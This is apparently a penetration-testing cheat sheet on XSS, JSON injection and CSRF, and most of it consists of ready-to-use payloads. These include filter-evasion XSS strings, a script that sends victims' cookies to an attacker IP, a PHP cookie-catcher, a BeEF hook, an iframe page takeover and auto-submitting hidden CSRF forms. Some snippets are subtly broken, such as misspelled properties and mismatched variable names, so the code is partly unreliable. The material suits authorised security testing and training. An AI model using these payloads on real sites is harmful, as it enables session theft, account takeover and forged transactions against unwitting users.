---
title: XSS, Javascript, and CSRF
category: Web Application
order: 5
---

> **XSS Reflection Testing**

**Using Burp - Step 1:** 
1. Intruder-> Battering Ram (include user-agent, referer, cookie values)
2. Payoad -> Use a magic string: 9vqkz (any random string)
3. Options -> Search responses for payload strings -> magic string
4. Sort on p grep, if found change attack type to sniper.

**Using Burp - Step 2 Filter Test:**
1. Repeat above with sniper and the following payloads (simple list):
* <code> &lt;&gt;[]{}()$--'#&#34;&amp;;/ </code>
* <code> '';!--&#34;&lt;XSS&gt;=&amp;{()}</code>
* <code> &lt;x&gt;'&#34;()= </code>
* <code> ;[]{}'"() </code>
* <code> jAvaSCript:prompt(9vqkz) </code>
* <code> &lt;script&gt;alert(42);&lt;/script&gt; </code>

**Additional Payloads:**
* Fuzzdb /attack-payloads/xss
* JBroFuzz (built into ZAP)
* Burp (Pro provides expanded payloads)
* ZAP (JBroFUzz and some fuzzdb)
* XSSer (includes some that the others don't have)

**Additional XSS Test Strings**
{% highlight html %}
<script>alert(document.cookie);</script>
<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
<script src=http://www.example.com/malicious-code.js></script>
%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
>"><script>alert("XSS")</script>&
"><STYLE>@import"javascript:alert('XSS')";</STYLE>

//Only works for IE6 and earlier
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')> 
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
{% endhighlight %}

**Tools:**
* XSSer 
* xssniper
* XSScrapy (xsssniper -u "http://sec542.com" --crawl --forms -http-proxy 127.0.0.1:8082)

**Resources:**
* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

> **Javascript Events for XSS**

onload | change content after it loads
onunload | launch pop-under window to retain control of a zombie browser
onsubmit | change form values os the transaction is one of the attacker's choosing
onfocus | send http request to the attacker's web server to reveal which controls the user is selecting

> **XSS Exploitation**

**Exploitation Options**
* Redirect to competitor (or other equivantly bad site) 
	* <code> window.location.href = "http://www.sec542.org" ; </code>
* Have form submit to you:
	* <code> document.forms[1].action="http://www.sec542.org" </code>
* Add Competitor logo
* Negative fake information (or other content modification)
* Read cookies
* Fake Login Site 

**Basic Stealing Cookie:**
{% highlight html %}
<!-- Attacker -->
python -m SimpleHTTPServer 

<!-- Victim -->
<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
{% endhighlight %}

**POST:**
*Needs CSRF Vulnerability to work*
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}

**XSS Cookie Catcher**
{% highlight php %}

#Attacker
<?php
$cookies = $_SERVER['REQUEST_URI'];
$output = "Received=".$cookies."\n";
$fh = fopen("/tmp/cookiedump", "a+");
$contents = fwrite($fh, $output);
fclose($fh);
echo "FOO!";
?>

#Victim
http://www.sec542.org/PhpMyAdmin/index.php?lang=<script>var lo=document.location;document.location='//[AttackerIP]/cookiecatcher.php?'%2bdocument.cookie;var la = new Array();la = lo.toString().split('?');document.location=la[0];</script>
"
{% endhighlight %}

**Take Over a Page**
{% highlight html %}
<style type="text/css"> <! -- .style11 {position:fixed; top:0px; left:0px; bottom:0px; right:opx; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;} //-->
</style>

<iframe class="style11" src="http://127.127.127.127/www.sans.org/account/" frameborder="0" scrolling="no" />
{% endhighlight %}

**BEEF**
{% highlight html %}
<script src=http://beefserver:3000/hook.js></script>
<!-- Most important is the browser exploitation - Metasploit attack payloads -->
{% endhighlight %}


>**XML HTTP Request**

{% highlight javascript %}
//Create the oject
xmlhttp = new XMLHttpRequest();
//Sets which function should be called when the ready state changes (AJAXProcess is a custom function)
xmlhttp.onreadystatechange = function () { if (xhr.readyState ==4 && xhr.status ==200) { document.getElementByID("answer").innerHTML = xhr.responseText;}}
//set up the request
xmlhttp.open("GET", "http://www.sec542.org/index.php");
//Send the request
xmlhttp.send();
//The property that contains the current ready state
xmlhttp.readyState
//THe property that contains the contents of any response from the server
xmlhttp.responseText
{% endhighlight %}

>**Exploiting JSON**

Look for:
1. Too much data provided from server and being filtered on the client
	* Use burp/zap to look at JSON data sent for extra data or error messages
2. Error messages provided from server but filtered on the client
	* Use burp/zap to look at JSON data sent for extra data or error messages
3. Injection (JSON to the server, or JSON in the response, eval)
	* Intercept the JSON and insert attack strings (XSS, SQL), be careful with XSS because it is in a JSON object that is going to be parsed and break out of it appropriately.

>**XSS JSON**

If data is reflected from input into JSON Object (9vqkz is test string):
{% highlight javascript %}
{"query": {"toolIDRequested": "9vqkz", "penTestTools": []}}

Example escape using concatinate:
Prefix: 1"+
Paylod: eval(alert(1))
Suffix:+1

prefix: 1"%2b
Payload: eval(alert(1))
Suffix: %2b"1

prefix: 4"}}); 
payload: alert(1);
suffix:   //
{% endhighlight %}

> **CSRF**

Look for:
1. No CSRF Token
2. Actions that perform a sensitive or important action
	* Network Devices to allow bad guys to come in
3. Transaction that contains predictable parameters

> **CSRF Exploits**

With ZAP:
1. Right Click on the request in the history
2. Generate Anti CSRF Test From
3. In a logged in session test form

*Burp also has one in the pro version*

{% highlight html %}
GET:
Image tag 
<img src="https://a.tld/t.php?acct=12345&amt=1000">

IFRAME
<iframe src="https;//a.tld/t.php?acct=12345&amt1000">
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>

CSS or Javascript import 

XMLHTTPRequest
{% endhighlight %}

{% highlight html %}
<html>
<body onload="f1.submit()";>
<h3>http://www.sec542.org/sec542_oldforum/posting.php</h3><form id="f1" method="POST" action="http://www.sec542.org/sec542_oldforum/posting.php">
<table>
<tr><td>
post<td><input name="post" value="Submit" size="100"></tr>
<tr><td>
message<td><input name="message" value="test :D " size="100"></tr>
</table>
</form>
<button onclick="document.getElementById('f1').submit()">Submit</button>
</body>
</html>
{% endhighlight %}

> **Useful Resources**

* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors) 
* [XSS Examples](http://www.xssed.com/)
* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [XSS Examples](http://www.xssed.com/)

> **Useful Tools**
* XSSer 
* xssniper
* XSScrapy (xsssniper -u "http://sec542.com" --crawl --forms -http-proxy 127.0.0.1:8082)


